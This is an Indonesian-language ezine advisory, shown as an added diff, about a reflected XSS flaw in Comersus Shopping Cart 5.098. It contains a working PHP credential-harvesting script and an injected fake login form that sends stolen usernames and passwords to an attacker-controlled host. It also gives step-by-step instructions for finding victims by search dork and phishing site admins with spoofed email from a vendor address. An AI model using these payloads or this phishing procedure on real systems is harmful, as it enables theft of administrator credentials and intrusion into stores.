@@ -1,0 +1,104 @@
+	____________________   ___ ___ ________   
+	\_   _____/\_   ___ \ /   |   \\_____  \  
+	 |    __)_ /    \  \//    ~    \/   |   \ 
+	 |        \\     \___\    Y    /    |    \
+	/_______  / \______  /\___|_  /\_______  /
+	        \/         \/       \/         \/ 
+		 				.OR.ID
+
+
+Author : az001 || az001@plasa.com || az001@cornets.net || az001@telkom.net
+Online @ www.echo.or.id :: http://ezine.echo.or.id
+
+
+== Comersus Shopping Cart 5.098 XSS Vulnerability ==
+
+
+Cross Site Scripting atau lebih dikenal dengan XSS merupakan salah satu teknik yang 
+dipakai untuk "mengakali" sebuah aplikasi web.
+
+Baru-baru ini saya menemukan adanya kelemahan pada Comersus Shopping Cart,sebuah 
+aplikasi shopping cart yang berbasis ASP.
+
+Versi Comersus : 5.098 ( Terbaru ) dan sebelumnya
+
+Kelemahannya ada di halaman ini :
+
+/store/comersus_message.asp
+/backofficeLite/comersus_backoffice_message.asp
+
+
+Contoh ,untuk mengecek vulnerability:
+
+http://az001/comersus/store/comersus_message.asp?message=<h4>Vulnerable</h4>
+http://az001/comersus/backofficeLite/comersus_backoffice_message.asp?message=<h4>Vulnerable</h4>
+
+
+Hanya itu saja ?????
+
+
+TIDAK , kita bisa melakukan hal lain ,namun sebelum itu kita buat dulu file yang kita 
+namakan ambilcom.php dan letakkan di server kita(http://mysite.org),sebenarnya bisa 
+menggunakan bahasa yang lain ,itu terserah anda:
+
+<?
+//ambilcom.php
+$buka = fopen("comersus.txt","a+");
+fwrite($buka,"User:".$uid."|"."Password:".$passwd."|");
+fclose($buka);
+header("Location:http://az001/comersus/backofficelite/comersus_backoffice_message.asp?message=Your+authentication+data+is+incorrect...");
+exit();
+?>
+
+
+Masukkan url berikut di browser anda:
+
+http://az001/comersus/backofficelite/comersus_backoffice_message.asp?message=<form%20action=http://mysite.org/ambilcom.php%20method=post><h3>BackOffice%20Lite</h3><p>User<br><input%20type=text%20name=uid><br>Password<br><input%20type=password%20name=passwd><p><input%20type=submit%20value=%20Login%20></form>
+
+
+Nah lihat apa yang terjadi muncul form login , coba isi username+passwordnya terserah anda dan klik submit .... ,apa yang terjadi ? muncul pesan : Your authentication data is incorrect...
+
+Tidak apa -apa itu hanyalah pesan bohong semata , coba lihat di server anda (http://mysite.org/comersus.txt)
+
+Wow ... ada username+password yang kita masukkan tadi
+ 
+
+
+
+:: Bagaimana "mengerjai" situs lain ?
+
+
+1. Cari target di google ,keyword : powered by comersus
+
+2. Setelah menemukan target, enter url http://www.targetnya.com/comersus/store/comersus_contactUs.asp
+
+3. Catat email situs tersebut
+
+4. Lalu kirim fake/anonymous email(dalam format html) ke situs tsb,misal admin@target.net yang isinya terserah anda yang    penting agar pengelola     tersebut tertarik untuk membaca dan  "mengklik" url yang kita berikan . Ingat kita mengirim       email dari ,misal      support@comersus.com
+
+    Misal :
+
+    blablablablabla..................... ,click <a href="http://www.targetnya.com/comersus/backofficelite/comersus_backoffice_message.asp?message=<form%20action=http://mysite.org/ambilcom.php%20method=post><h3>BackOffice%20Lite</h3><p>User<br><input%20type=text%20name=uid><br>Password<br><input%20type=password%20name=passwd><p><input%20type=submit%20value=%20Login%20></form>"> here </a> for login
+
+
+
+5. Tunggu admin itu membaca dan mengklik url tersebut,lihat terus perkembangannya di http://mysite.org/comersus.txt
+   Jika admin itu sudah login dari url yang kita berikan,file itu akan berisi user+password admin tsb
+
+
+Tulisan ini dibuat agar bermanfaat bagi kita semua terutama para pengelola situs agar tidak
+mudah percaya pada aplikasi yang dibuat oleh "orang luar",mengapa ? Karena kita bisa buat 
+sendiri dan bisa lebih baik dari produk mereka 
+
+
+Jika ada yang menemukan tutorial yang serupa/semacam ini (Vulnerability COmersus 5.098) 
+di situs lain dengan penulis yang berbeda, mungkin penulis itu telah lebih dulu menemukan 
+vulnerability ini ,............. sialan telat lagi donk gw ..
+
+Kritik dan Kritik atau (mungkin) pujian saya akan terima agar tutorial yang saya buat lebih baik lagi
+
+Thanks to : Seviour , Ojjan (lysix44), ewied00,KISS ,Baghdad,Bajak Laut ,yang mau Pembaca
+
+Referensi : Web Apllication Security and Defense in Depth Security Checklist
+            Phil Janzen Sans Institute,2004
+      
